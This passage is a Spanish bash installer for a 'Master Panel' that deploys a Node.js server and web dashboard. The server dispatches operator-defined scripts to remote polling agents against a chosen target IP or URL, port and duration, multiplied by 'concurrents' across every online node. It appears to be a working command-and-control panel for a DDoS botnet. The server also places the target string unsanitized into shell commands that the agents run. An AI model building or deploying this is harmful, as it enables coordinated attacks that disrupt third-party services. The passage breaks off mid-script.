#!/bin/bash
set -euo pipefail

# ============================================================
#  MASTER PANEL INSTALLER v2.0
#  Sistema de Administración de Servidores
#  Cambios: concurrents por tarea, sin bloqueo busy, limpieza offline
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

banner() {
  echo -e "${CYAN}${BOLD}"
  echo "╔══════════════════════════════════════════════╗"
  echo "║       MASTER PANEL INSTALLER v2.0            ║"
  echo "║    Sistema de Administración de Nodos        ║"
  echo "╚══════════════════════════════════════════════╝"
  echo -e "${NC}"
}

step() { echo -e "\n${GREEN}[${1}/${TOTAL}]${NC} ${BOLD}${2}${NC}"; }
info() { echo -e "  ${CYAN}→${NC} ${1}"; }
ok()   { echo -e "  ${GREEN}✔${NC} ${1}"; }
err()  { echo -e "  ${RED}✘ ERROR:${NC} ${1}"; exit 1; }

TOTAL=8
INSTALL_DIR="/opt/master"
AGENT_TOKEN=$(openssl rand -hex 32)
PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || echo "TU_IP_AQUI")

banner

[ "$EUID" -ne 0 ] && err "Ejecutar como root: sudo bash install-master.sh"

# ============================================================
# [1/8] SYSTEM DEPENDENCIES
# ============================================================
step 1 "Instalando dependencias del sistema..."

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y curl nginx openssl build-essential git sqlite3 > /dev/null 2>&1
ok "nginx, openssl, build-essential, sqlite3 instalados"

if ! command -v node &>/dev/null || [[ "$(node -v | cut -d. -f1 | tr -d 'v')" -lt 18 ]]; then
  info "Instalando Node.js 20..."
  curl -fsSL https://deb.nodesource.com/setup_20.x | bash - > /dev/null 2>&1
  apt-get install -y nodejs > /dev/null 2>&1
fi
ok "Node.js $(node -v) listo"

# ============================================================
# [2/8] DIRECTORY STRUCTURE
# ============================================================
step 2 "Creando estructura de directorios..."
mkdir -p $INSTALL_DIR/public $INSTALL_DIR/scripts
ok "Directorios creados"

# ============================================================
# [3/8] BACKEND FILES
# ============================================================
step 3 "Generando archivos del servidor..."

cat > $INSTALL_DIR/package.json << 'PKGJSON'
{
  "name": "master-panel",
  "version": "2.0.0",
  "description": "Master Panel - Node Management System",
  "main": "server.js",
  "scripts": { "start": "node server.js" },
  "dependencies": {
    "better-sqlite3": "^9.4.3",
    "express": "^4.18.3"
  }
}
PKGJSON

cat > $INSTALL_DIR/.env << ENVEOF
AGENT_TOKEN=$AGENT_TOKEN
PORT=3000
ENVEOF
chmod 600 $INSTALL_DIR/.env

cat > $INSTALL_DIR/server.js << 'SERVEREOF'
'use strict';

const express  = require('express');
const Database = require('better-sqlite3');
const http     = require('http');
const path     = require('path');

const app   = express();
const PORT  = process.env.PORT  || 3000;
const TOKEN = process.env.AGENT_TOKEN || 'changeme';
const DB_PATH = path.join(__dirname, 'master.db');

// ─── DATABASE ────────────────────────────────────────────
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

db.exec(`
  CREATE TABLE IF NOT EXISTS nodes (
    id           TEXT PRIMARY KEY,
    name         TEXT NOT NULL,
    ip           TEXT DEFAULT '',
    country      TEXT DEFAULT 'Unknown',
    country_code TEXT DEFAULT '',
    cpu          REAL DEFAULT 0,
    ram          REAL DEFAULT 0,
    total_tasks  INTEGER DEFAULT 0,
    last_seen    INTEGER DEFAULT 0,
    status       TEXT DEFAULT 'offline'
  );

  CREATE TABLE IF NOT EXISTS methods (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    name          TEXT NOT NULL,
    type          TEXT NOT NULL,
    requires_port INTEGER DEFAULT 0,
    function_type TEXT NOT NULL,
    file_name     TEXT NOT NULL,
    arguments     TEXT DEFAULT '',
    created_at    INTEGER DEFAULT 0
  );

  CREATE TABLE IF NOT EXISTS tasks (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    method_id    INTEGER,
    method_name  TEXT,
    target       TEXT NOT NULL,
    port         INTEGER,
    time         INTEGER NOT NULL,
    concurrents  INTEGER DEFAULT 1,
    status       TEXT DEFAULT 'pending',
    created_at   INTEGER DEFAULT 0,
    completed_at INTEGER
  );

  CREATE TABLE IF NOT EXISTS task_nodes (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    task_id      INTEGER NOT NULL,
    node_id      TEXT NOT NULL,
    node_name    TEXT DEFAULT '',
    slot         INTEGER DEFAULT 1,
    status       TEXT DEFAULT 'pending',
    started_at   INTEGER,
    completed_at INTEGER
  );

  CREATE TABLE IF NOT EXISTS logs (
    id        INTEGER PRIMARY KEY AUTOINCREMENT,
    level     TEXT DEFAULT 'info',
    message   TEXT,
    timestamp INTEGER
  );
`);

// ─── SSE LOG BROADCAST ───────────────────────────────────
const logClients = new Set();

function addLog(level, message) {
  const timestamp = Date.now();
  db.prepare('INSERT INTO logs (level, message, timestamp) VALUES (?, ?, ?)').run(level, message, timestamp);
  const payload = `data: ${JSON.stringify({ level, message, timestamp })}\n\n`;
  for (const client of logClients) {
    try { client.write(payload); } catch (_) { logClients.delete(client); }
  }
  db.prepare('DELETE FROM logs WHERE id NOT IN (SELECT id FROM logs ORDER BY id DESC LIMIT 2000)').run();
}

// ─── BACKGROUND JOBS ─────────────────────────────────────

// Marcar nodos offline si no hay heartbeat en 35s
setInterval(() => {
  const cutoff = Date.now() - 35000;
  const r = db.prepare(`UPDATE nodes SET status='offline' WHERE last_seen < ? AND status != 'offline'`).run(cutoff);
  if (r.changes > 0) addLog('warn', `📡 ${r.changes} nodo(s) sin respuesta → offline`);
}, 15000);

// Eliminar nodos offline por más de 5 minutos
setInterval(() => {
  const cutoff = Date.now() - 300000;
  const r = db.prepare(`DELETE FROM nodes WHERE status='offline' AND last_seen < ?`).run(cutoff);
  if (r.changes > 0) addLog('warn', `🗑️ ${r.changes} nodo(s) offline eliminados automáticamente`);
}, 60000);

// Auto-completar tareas expiradas (tiempo + 60s buffer)
setInterval(() => {
  const now = Date.now();
  const expired = db.prepare(
    `SELECT * FROM tasks WHERE status IN ('pending','running') AND (created_at + (time * 1000) + 60000) < ?`
  ).all(now);
  for (const t of expired) {
    db.prepare(`UPDATE tasks SET status='completed', completed_at=? WHERE id=?`).run(now, t.id);
    db.prepare(`UPDATE task_nodes SET status='completed', completed_at=? WHERE task_id=? AND status IN ('pending','running')`).run(now, t.id);
    addLog('info', `⏰ Tarea #${t.id} completada por tiempo expirado`);
  }
}, 30000);

// ─── HELPERS ─────────────────────────────────────────────
function getGeo(ip) {
  return new Promise(resolve => {
    const clean = (ip || '').replace('::ffff:', '').split(',')[0].trim();
    if (!clean || clean === '127.0.0.1' || clean === '::1' || clean.startsWith('10.') || clean.startsWith('192.168.')) {
      return resolve({ country: 'Local', countryCode: 'LO' });
    }
    const req = http.get(`http://ip-api.com/json/${clean}?fields=country,countryCode`, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { try { resolve(JSON.parse(d)); } catch (_) { resolve({ country: 'Unknown', countryCode: '' }); } });
    });
    req.on('error', () => resolve({ country: 'Unknown', countryCode: '' }));
    req.setTimeout(5000, () => { req.destroy(); resolve({ country: 'Unknown', countryCode: '' }); });
  });
}

function buildCommand(method, task) {
  const args = (method.arguments || '')
    .replace(/{ip}/g,   task.target)
    .replace(/{url}/g,  task.target)
    .replace(/{host}/g, task.target)
    .replace(/{port}/g, task.port || '')
    .replace(/{time}/g, task.time);
  switch (method.function_type) {
    case 'python': return `python3 scripts/${method.file_name} ${args}`.trim();
    case 'node':   return `node scripts/${method.file_name} ${args}`.trim();
    default:       return `./scripts/${method.file_name} ${args}`.trim();
  }
}

// ─── MIDDLEWARE ───────────────────────────────────────────
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function agentAuth(req, res, next) {
  if (req.headers['x-agent-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
  next();
}

// ─── AGENT ROUTES ────────────────────────────────────────

app.post('/api/agent/register', agentAuth, async (req, res) => {
  try {
    const { node_id, name } = req.body;
    if (!node_id || !name) return res.status(400).json({ error: 'node_id and name required' });

    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip    = rawIp.replace('::ffff:', '').split(',')[0].trim();
    const geo   = await getGeo(ip);
    const now   = Date.now();

    const existing = db.prepare('SELECT id FROM nodes WHERE id = ?').get(node_id);
    if (existing) {
      db.prepare(`UPDATE nodes SET name=?, ip=?, country=?, country_code=?, last_seen=?, status='online' WHERE id=?`)
        .run(name, ip, geo.country, geo.countryCode, now, node_id);
      addLog('info', `🔄 Nodo reconectado: ${name} | ${ip} | ${geo.country}`);
    } else {
      db.prepare(`INSERT INTO nodes (id,name,ip,country,country_code,last_seen,status,total_tasks) VALUES (?,?,?,?,?,?,'online',0)`)
        .run(node_id, name, ip, geo.country, geo.countryCode, now);
      addLog('success', `✅ Nuevo nodo registrado: ${name} | ${ip} | ${geo.country}`);
    }
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: e.message }); }
});

app.post('/api/agent/poll', agentAuth, (req, res) => {
  try {
    const { node_id, cpu, ram } = req.body;
    const now  = Date.now();
    const node = db.prepare('SELECT * FROM nodes WHERE id=?').get(node_id);
    if (!node) return res.json({ task: null });

    // Verificar si alguna tarea en ejecución fue cancelada y notificar
    const runningEntries = db.prepare(`SELECT id, task_id FROM task_nodes WHERE node_id=? AND status='running'`).all(node_id);
    const cancelledTaskIds = [];
    for (const entry of runningEntries) {
      const t = db.prepare('SELECT status FROM tasks WHERE id=?').get(entry.task_id);
      if (t && t.status === 'cancelled') {
        db.prepare(`UPDATE task_nodes SET status='cancelled', completed_at=? WHERE id=?`).run(now, entry.id);
        cancelledTaskIds.push(entry.task_id);
      }
    }

    // Actualizar heartbeat — nodo siempre queda 'online' (no más 'busy')
    db.prepare(`UPDATE nodes SET cpu=?, ram=?, last_seen=?, status='online' WHERE id=?`).run(cpu||0, ram||0, now, node_id);

    if (cancelledTaskIds.length > 0) {
      return res.json({ cancel: true, task_ids: cancelledTaskIds });
    }

    // Buscar cualquier slot pendiente para este nodo (sin importar cuántos estén corriendo)
    const taskNode = db.prepare(
      `SELECT id, task_id, slot FROM task_nodes WHERE node_id=? AND status='pending' ORDER BY task_id ASC, slot ASC LIMIT 1`
    ).get(node_id);

    if (!taskNode) return res.json({ task: null });

    const task   = db.prepare('SELECT * FROM tasks WHERE id=?').get(taskNode.task_id);
    const method = task ? db.prepare('SELECT * FROM methods WHERE id=?').get(task.method_id) : null;

    if (!task || !method || task.status === 'cancelled') {
      db.prepare(`UPDATE task_nodes SET status='cancelled' WHERE id=?`).run(taskNode.id);
      return res.json({ task: null });
    }

    const command = buildCommand(method, task);

    db.prepare(`UPDATE task_nodes SET status='running', started_at=? WHERE id=?`).run(now, taskNode.id);
    db.prepare(`UPDATE tasks SET status='running' WHERE id=? AND status='pending'`).run(task.id);

    addLog('info', `⚡ Nodo ${node.name} → tarea #${task.id} slot ${taskNode.slot}`);
    res.json({ task: { id: task.id, task_node_id: taskNode.id, command, time: task.time } });

  } catch (e) { console.error(e); res.status(500).json({ error: e.message }); }
});

app.post('/api/agent/complete', agentAuth, (req, res) => {
  try {
    const { node_id, task_id, task_node_id, success } = req.body;
    const now  = Date.now();
    const node = db.prepare('SELECT name FROM nodes WHERE id=?').get(node_id);

    // Soporte para task_node_id (nuevo) o fallback por (task_id, node_id) (agentes viejos)
    let entry;
    if (task_node_id) {
      entry = db.prepare('SELECT id FROM task_nodes WHERE id=?').get(task_node_id);
    } else {
      entry = db.prepare(
        `SELECT id FROM task_nodes WHERE task_id=? AND node_id=? AND status='running' LIMIT 1`
      ).get(task_id, node_id);
    }

    if (entry) {
      db.prepare(`UPDATE task_nodes SET status=?, completed_at=? WHERE id=?`)
        .run(success ? 'completed' : 'failed', now, entry.id);
    }

    db.prepare(`UPDATE nodes SET total_tasks=total_tasks+1 WHERE id=?`).run(node_id);

    // Verificar si todos los slots de la tarea terminaron
    const pending = db.prepare(
      `SELECT COUNT(*) as c FROM task_nodes WHERE task_id=? AND status IN ('pending','running')`
    ).get(task_id);

    if (pending.c === 0) {
      db.prepare(`UPDATE tasks SET status='completed', completed_at=? WHERE id=?`).run(now, task_id);
      const task = db.prepare('SELECT target FROM tasks WHERE id=?').get(task_id);
      addLog('success', `✅ Tarea #${task_id} completada → ${task ? task.target : '?'}`);
    } else if (!success) {
      addLog('error', `❌ Nodo ${node?.name || node_id} falló slot en tarea #${task_id}`);
    }

    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── UI API ROUTES ────────────────────────────────────────

// Solo devuelve nodos activos (offline se auto-eliminan, pero filtramos por si acaso)
app.get('/api/nodes', (req, res) => {
  res.json(db.prepare(`SELECT * FROM nodes WHERE status != 'offline' ORDER BY last_seen DESC`).all());
});

app.get('/api/tasks', (req, res) => {
  const tasks = db.prepare(`
    SELECT t.*,
      (SELECT GROUP_CONCAT(tn.node_name || ':' || tn.status || ':' || tn.slot)
       FROM task_nodes tn WHERE tn.task_id = t.id) AS nodes_info
    FROM tasks t ORDER BY t.created_at DESC LIMIT 10
  `).all();
  res.json(tasks);
});

app.post('/api/tasks', (req, res) => {
  try {
    const { method_id, target, port, time, concurrents } = req.body;
    if (!method_id || !target || !time) return res.status(400).json({ error: 'Faltan campos requeridos' });

    const conc = Math.max(1, Math.min(50, parseInt(concurrents) || 1));

    const method = db.prepare('SELECT * FROM methods WHERE id=?').get(method_id);
    if (!method) return res.status(400).json({ error: 'Método no encontrado' });

    const available = db.prepare(`SELECT * FROM nodes WHERE status='online'`).all();
    if (available.length === 0) return res.status(400).json({ error: 'Sin nodos disponibles (online)' });

    const now = Date.now();
    const r   = db.prepare(
      `INSERT INTO tasks (method_id,method_name,target,port,time,concurrents,status,created_at) VALUES (?,?,?,?,?,?,'pending',?)`
    ).run(method_id, method.name, target, port || null, parseInt(time), conc, now);
    const taskId = r.lastInsertRowid;

    // Insertar N slots por cada nodo disponible
    const ins = db.prepare(`INSERT INTO task_nodes (task_id,node_id,node_name,slot,status) VALUES (?,?,?,?,'pending')`);
    for (const n of available) {
      for (let slot = 1; slot <= conc; slot++) {
        ins.run(taskId, n.id, n.name, slot);
      }
    }

    const totalSlots = available.length * conc;
    addLog('info', `🚀 Tarea #${taskId} | [${method.name}] → ${target} | ${available.length} nodos × ${conc} = ${totalSlots} slots | ${time}s`);
    res.json({ success: true, task_id: taskId, nodes: available.length, concurrents: conc, total_slots: totalSlots });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/tasks/:id', (req, res) => {
  db.prepare(`UPDATE tasks SET status='cancelled' WHERE id=? AND status IN ('pending','running')`).run(req.params.id);
  db.prepare(`UPDATE task_nodes SET status='cancelled' WHERE task_id=? AND status IN ('pending','running')`).run(req.params.id);
  addLog('warn', `🛑 Tarea #${req.params.id} cancelada por operador`);
  res.json({ success: true });
});

app.get('/api/methods', (req, res) => {
  res.json(db.prepare('SELECT * FROM methods ORDER BY name').all());
});

app.post('/api/methods', (req, res) => {
  const { name, type, requires_port, function_type, file_name, arguments: args } = req.body;
  if (!name || !type || !function_type || !file_name) return res.status(400).json({ error: 'Faltan campos' });
  const r = db.prepare(
    `INSERT INTO methods (name,type,requires_port,function_type,file_name,arguments,created_at) VALUES (?,?,?,?,?,?,?)`
  ).run(name, type, requires_port ? 1 : 0, function_type, file_name, args || '', Date.now());
  addLog('info', `📋 Método creado: ${name} [${type.toUpperCase()}]`);
  res.json({ success: true, id: r.lastInsertRowid });
});

app.put('/api/methods/:id', (req, res) => {
  const { name, type, requires_port, function_type, file_name, arguments: args } = req.body;
  db.prepare(`UPDATE methods SET name=?,type=?,requires_port=?,function_type=?,file_name=?,arguments=? WHERE id=?`)
    .run(name, type, requires_port ? 1 : 0, function_type, file_name, args || '', req.params.id);
  addLog('info', `📝 Método actualizado: ${name}`);
  res.json({ success: true });
});

app.delete('/api/methods/:id', (req, res) => {
  const m = db.prepare('SELECT name FROM methods WHERE id=?').get(req.params.id);
  db.prepare('DELETE FROM methods WHERE id=?').run(req.params.id);
  addLog('warn', `🗑️ Método eliminado: ${m?.name}`);
  res.json({ success: true });
});

app.get('/api/logs', (req, res) => {
  res.json(db.prepare('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 200').all().reverse());
});

app.get('/api/logs/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();

  const recent = db.prepare('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 60').all().reverse();
  for (const log of recent) res.write(`data: ${JSON.stringify(log)}\n\n`);

  logClients.add(res);
  const hb = setInterval(() => { try { res.write(': ping\n\n'); } catch (_) { clearInterval(hb); } }, 25000);
  req.on('close', () => { logClients.delete(res); clearInterval(hb); });
});

app.get('/',        (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/methods', (_, res) => res.sendFile(path.join(__dirname, 'public', 'methods.html')));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[MASTER] Iniciado en puerto ${PORT}`);
  addLog('success', `🟢 Master Panel v2.0 iniciado — puerto ${PORT}`);
});
SERVEREOF

ok "server.js creado"

# ============================================================
# [4/8] FRONTEND — index.html
# ============================================================
step 4 "Generando panel web (index.html)..."

cat > $INSTALL_DIR/public/index.html << 'INDEXEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Master Panel</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#070a12;--surface:#0c1220;--card:#111d2e;--card2:#0f1928;
  --border:#1a2e4a;--border2:#243d5f;
  --accent:#00d4aa;--accent2:#00a882;--accent-dim:rgba(0,212,170,.08);
  --danger:#ff4d6d;--danger-dim:rgba(255,77,109,.1);
  --warn:#ffd166;--warn-dim:rgba(255,209,102,.1);
  --info:#4da6ff;--info-dim:rgba(77,166,255,.1);
  --text:#c8d8e8;--muted:#4a6888;--muted2:#2a4a68;
  --font:'JetBrains Mono',monospace;
}
*{margin:0;padding:0;box-sizing:border-box;}
html{scrollbar-width:thin;scrollbar-color:var(--border) var(--bg);}
body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:13px;min-height:100vh;
  background-image:radial-gradient(ellipse at 20% 0%,rgba(0,212,170,.04) 0%,transparent 60%),
                   radial-gradient(ellipse at 80% 100%,rgba(77,166,255,.03) 0%,transparent 60%);
}

/* HEADER */
header{
  position:sticky;top:0;z-index:50;
  background:rgba(7,10,18,.92);backdrop-filter:blur(12px);
  border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;
  padding:.75rem 1.5rem;
}
.logo{display:flex;align-items:center;gap:.6rem;}
.logo-icon{font-size:1.1rem;}
.logo-text{font-size:.9rem;font-weight:700;color:var(--accent);letter-spacing:3px;text-transform:uppercase;}
nav{display:flex;align-items:center;gap:1.5rem;}
nav a{color:var(--muted);text-decoration:none;font-size:.75rem;letter-spacing:1.5px;text-transform:uppercase;transition:color .2s;}
nav a:hover,nav a.active{color:var(--text);}
nav a.active{color:var(--accent);}
.status-pill{display:flex;align-items:center;gap:.4rem;font-size:.7rem;color:var(--accent);letter-spacing:1px;}
.status-dot{width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:blink 2s infinite;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}

/* LAYOUT */
.wrap{max-width:1440px;margin:0 auto;padding:1.25rem 1.5rem;}
.grid-top{display:grid;grid-template-columns:1fr 360px;gap:1.25rem;margin-bottom:1.25rem;}
@media(max-width:900px){.grid-top{grid-template-columns:1fr;}}

/* CARD */
.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1.1rem;}
.card-hd{display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;padding-bottom:.6rem;border-bottom:1px solid var(--border);}
.card-title{font-size:.65rem;font-weight:700;letter-spacing:2.5px;color:var(--muted);text-transform:uppercase;}
.card-badge{font-size:.65rem;font-weight:600;letter-spacing:1px;padding:.2rem .5rem;border-radius:4px;}

/* FORM */
.fg{margin-bottom:.85rem;}
label{display:block;font-size:.65rem;letter-spacing:1.5px;color:var(--muted);margin-bottom:.3rem;text-transform:uppercase;}
select,input[type=text],input[type=number]{
  width:100%;background:var(--surface);border:1px solid var(--border);border-radius:5px;
  color:var(--text);padding:.5rem .7rem;font-family:var(--font);font-size:.85rem;
  outline:none;transition:border-color .2s,box-shadow .2s;
}
select:focus,input:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,212,170,.12);}
select option{background:var(--card);}

/* Concurrent row */
.conc-row{display:grid;grid-template-columns:1fr 1fr;gap:.85rem;}

/* Concurrent stepper */
.conc-wrap{display:flex;align-items:center;gap:0;border:1px solid var(--border);border-radius:5px;overflow:hidden;}
.conc-btn{background:var(--surface);border:none;color:var(--muted);cursor:pointer;font-family:var(--font);font-size:1rem;font-weight:700;padding:.45rem .7rem;transition:all .15s;flex-shrink:0;}
.conc-btn:hover{background:var(--border);color:var(--text);}
.conc-val{flex:1;background:var(--surface);border:none;color:var(--accent);font-family:var(--font);font-size:.95rem;font-weight:700;text-align:center;padding:.45rem .3rem;outline:none;}
.conc-hint{font-size:.6rem;color:var(--muted);margin-top:.3rem;letter-spacing:.5px;}

.btn{
  display:inline-flex;align-items:center;justify-content:center;gap:.4rem;
  border:none;border-radius:5px;cursor:pointer;
  font-family:var(--font);font-size:.78rem;font-weight:600;letter-spacing:1.5px;
  text-transform:uppercase;transition:all .2s;padding:.5rem 1rem;
}
.btn-primary{background:var(--accent);color:#070a12;width:100%;padding:.75rem;}
.btn-primary:hover{background:var(--accent2);}
.btn-primary:disabled{opacity:.4;cursor:not-allowed;}
.btn-ghost{background:transparent;border:1px solid var(--border);color:var(--muted);}
.btn-ghost:hover{border-color:var(--border2);color:var(--text);}
.btn-cancel{background:var(--danger-dim);border:1px solid var(--danger);color:var(--danger);font-size:.65rem;padding:.25rem .6rem;}
.btn-cancel:hover{background:var(--danger);color:#fff;}

/* NODES */
.node-card{
  display:flex;align-items:center;gap:.7rem;
  padding:.65rem .75rem;border:1px solid var(--border);border-radius:6px;
  margin-bottom:.5rem;transition:border-color .2s;
}
.node-card:hover{border-color:var(--border2);}
.node-flag{font-size:1.35rem;line-height:1;}
.node-body{flex:1;min-width:0;}
.node-name{font-size:.82rem;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.node-meta{font-size:.65rem;color:var(--muted);margin-top:.15rem;}
.node-bars{display:flex;flex-direction:column;gap:4px;align-items:flex-end;min-width:90px;}
.bar-row{display:flex;align-items:center;gap:.4rem;font-size:.62rem;color:var(--muted);}
.bar-track{width:60px;height:3px;background:var(--border);border-radius:2px;}
.bar-fill{height:100%;border-radius:2px;transition:width .6s;}
.ndot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
.ndot.online{background:var(--accent);box-shadow:0 0 6px var(--accent);}
.ndot.offline{background:var(--muted2);}

/* TASKS */
.task-row{padding:.7rem .85rem;border:1px solid var(--border);border-radius:6px;margin-bottom:.45rem;transition:border-color .2s;}
.task-row:hover{border-color:var(--border2);}
.task-top{display:flex;align-items:flex-start;justify-content:space-between;gap:.5rem;margin-bottom:.35rem;}
.task-id{font-size:.65rem;color:var(--muted);margin-right:.4rem;}
.task-name{font-size:.88rem;font-weight:600;color:var(--text);}
.task-target{font-size:.78rem;color:var(--accent);margin-top:.1rem;}
.task-meta{font-size:.65rem;color:var(--muted);margin-top:.3rem;}
.task-nodes{margin-top:.35rem;display:flex;flex-wrap:wrap;gap:.3rem;}
.task-node-chip{font-size:.6rem;padding:.15rem .5rem;border-radius:20px;border:1px solid;display:inline-flex;align-items:center;gap:.3rem;}
.chip-dot{width:5px;height:5px;border-radius:50%;flex-shrink:0;}

.badge{padding:.2rem .55rem;border-radius:20px;font-size:.62rem;font-weight:700;letter-spacing:.5px;text-transform:uppercase;white-space:nowrap;}
.badge-pending{background:var(--warn-dim);color:var(--warn);border:1px solid rgba(255,209,102,.3);}
.badge-running{background:var(--accent-dim);color:var(--accent);border:1px solid rgba(0,212,170,.3);}
.badge-completed{background:rgba(74,104,136,.1);color:var(--muted);border:1px solid rgba(74,104,136,.3);}
.badge-cancelled{background:var(--danger-dim);color:var(--danger);border:1px solid rgba(255,77,109,.3);}
.badge-failed{background:var(--danger-dim);color:var(--danger);border:1px solid rgba(255,77,109,.3);}

/* LOGS */
.log-wrap{height:260px;overflow-y:auto;font-size:.72rem;line-height:1.8;}
.log-wrap::-webkit-scrollbar{width:4px;}
.log-wrap::-webkit-scrollbar-track{background:transparent;}
.log-wrap::-webkit-scrollbar-thumb{background:var(--border);}
.log-entry{display:flex;gap:.75rem;padding:.05rem 0;border-bottom:1px solid rgba(255,255,255,.02);}
.log-ts{color:var(--muted2);min-width:76px;flex-shrink:0;}
.log-lv{min-width:68px;flex-shrink:0;font-weight:600;}
.log-lv.info{color:var(--info);}
.log-lv.success{color:var(--accent);}
.log-lv.warn{color:var(--warn);}
.log-lv.error{color:var(--danger);}
.log-msg{color:var(--text);}

.empty{text-align:center;padding:2rem;color:var(--muted);font-size:.78rem;}
.sect-mb{margin-bottom:1.25rem;}
</style>
</head>
<body>

<header>
  <div class="logo">
    <span class="logo-icon">⚡</span>
    <span class="logo-text">Master Command</span>
  </div>
  <nav>
    <a href="/" class="active">Dashboard</a>
    <a href="/methods">Métodos</a>
    <span class="status-pill"><span class="status-dot"></span>ONLINE</span>
  </nav>
</header>

<div class="wrap">

  <!-- TOP GRID -->
  <div class="grid-top">

    <!-- LAUNCH CARD -->
    <div class="card">
      <div class="card-hd">
        <span class="card-title">🚀 Lanzar Operación</span>
        <span id="avail-nodes" class="card-badge" style="background:var(--accent-dim);color:var(--accent)">0 nodos online</span>
      </div>

      <div class="fg">
        <label>Método</label>
        <select id="sel-method">
          <option value="">Cargando...</option>
        </select>
      </div>

      <div id="form-body" style="display:none">
        <div class="fg" id="fg-target">
          <label id="lbl-target">Objetivo</label>
          <input type="text" id="inp-target" placeholder="192.168.1.1">
        </div>

        <div class="conc-row">
          <div class="fg" id="fg-port" style="display:none">
            <label>Puerto</label>
            <input type="number" id="inp-port" placeholder="80" min="1" max="65535">
          </div>
          <div class="fg">
            <label>Tiempo (segundos)</label>
            <input type="number" id="inp-time" placeholder="60" min="1" max="7200">
          </div>
        </div>

        <!-- CONCURRENTS -->
        <div class="fg">
          <label>Concurrentes por nodo</label>
          <div class="conc-wrap">
            <button class="conc-btn" onclick="adjConc(-1)">−</button>
            <input class="conc-val" type="number" id="inp-conc" value="1" min="1" max="50" readonly>
            <button class="conc-btn" onclick="adjConc(1)">+</button>
          </div>
          <div class="conc-hint" id="conc-hint">1 ejecución por nodo</div>
        </div>

        <button class="btn btn-primary" id="btn-launch" onclick="launch()">
          ⚡ Ejecutar Operación
        </button>
      </div>

      <div id="form-empty" class="empty">
        Selecciona un método para continuar<br>
        <a href="/methods" style="color:var(--accent);text-decoration:none;font-size:.72rem;margin-top:.5rem;display:inline-block">+ Crear método →</a>
      </div>
    </div>

    <!-- NODES CARD -->
    <div class="card">
      <div class="card-hd">
        <span class="card-title">🖥 Nodos Activos</span>
        <span id="node-count" class="card-badge" style="background:var(--accent-dim);color:var(--accent)">0</span>
      </div>
      <div id="nodes-list"><div class="empty">Sin nodos registrados</div></div>
    </div>

  </div>

  <!-- TASKS -->
  <div class="card sect-mb">
    <div class="card-hd">
      <span class="card-title">📋 Últimas Operaciones</span>
      <span style="font-size:.62rem;color:var(--muted)">auto-refresh 5s</span>
    </div>
    <div id="tasks-list"><div class="empty">Sin operaciones registradas</div></div>
  </div>

  <!-- LOGS -->
  <div class="card">
    <div class="card-hd">
      <span class="card-title">📡 Log del Sistema</span>
      <button class="btn btn-ghost" style="font-size:.65rem;padding:.25rem .6rem" onclick="document.getElementById('log-wrap').innerHTML=''">Limpiar</button>
    </div>
    <div class="log-wrap" id="log-wrap"></div>
  </div>

</div>

<script>
let methods = [];
let curMethod = null;

function flag(code) {
  if (!code || code.length !== 2) return '🌍';
  return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)));
}
function ts(ms) {
  return new Date(ms).toLocaleTimeString('es-PE', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
}
function esc(s) {
  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ── Concurrent stepper ────────────────────────────────────
function adjConc(delta) {
  const inp = document.getElementById('inp-conc');
  const val = Math.max(1, Math.min(50, (parseInt(inp.value) || 1) + delta));
  inp.value = val;
  updateConcHint();
}
function updateConcHint() {
  const val = parseInt(document.getElementById('inp-conc').value) || 1;
  const hint = document.getElementById('conc-hint');
  const nodes = parseInt(document.getElementById('node-count').textContent) || 0;
  const total = nodes * val;
  if (val === 1) hint.textContent = `1 ejecución por nodo`;
  else hint.textContent = `${val} ejecuciones por nodo → ${total} total en ${nodes} nodo(s)`;
}
document.getElementById('inp-conc').addEventListener('change', () => {
  const inp = document.getElementById('inp-conc');
  inp.value = Math.max(1, Math.min(50, parseInt(inp.value) || 1));
  updateConcHint();
});

// ── Methods ───────────────────────────────────────────────
async function loadMethods() {
  try {
    const r = await fetch('/api/methods');
    methods = await r.json();
    const sel = document.getElementById('sel-method');
    if (!methods.length) {
